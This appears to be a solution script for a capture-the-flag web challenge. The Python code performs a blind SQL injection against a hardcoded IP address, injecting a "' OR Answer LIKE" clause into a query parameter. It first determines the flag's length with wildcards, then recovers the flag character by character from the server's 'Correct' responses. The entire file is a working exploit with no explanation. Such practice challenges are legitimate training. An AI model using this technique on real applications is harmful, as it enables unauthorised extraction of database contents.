#!/usr/bin/env python3

import string
import requests
from urllib.parse import urlencode, quote_plus
import time

url = 'http://34.126.139.50:10512/'

query_string = {"qn_id": 42, "ans": "' OR Answer LIKE 'grey{%"}

found_length = False
length = 0
while not found_length:
    for i in range(1, 100):
        query_string["ans"] = "' OR Answer LIKE 'grey{" + "_" * i + "}"
        query_encoded = urlencode(query_string, quote_via=quote_plus)
        r = requests.get(url + "?" + query_encoded)
        if 'Correct' in r.text:
            found_length = True
            length = i
            break

print(length)

content = ""
while len(content) < 10:
    for i in string.printable[:-16]:
        if i in ['%', "'"]:
            continue
        query_string["ans"] = "' OR Answer LIKE 'grey{" + content + \
            i + "_" * (9 - len(content)) + "}"
        query_encoded = urlencode(query_string, quote_via=quote_plus)
        print(query_string["ans"])
        r = requests.get(url + "?" + query_encoded)
        if 'Correct' in r.text:
            content += i
            break
        time.sleep(0.2)
    else:
        content += "_"
    print(f"grey{{{content}}}")
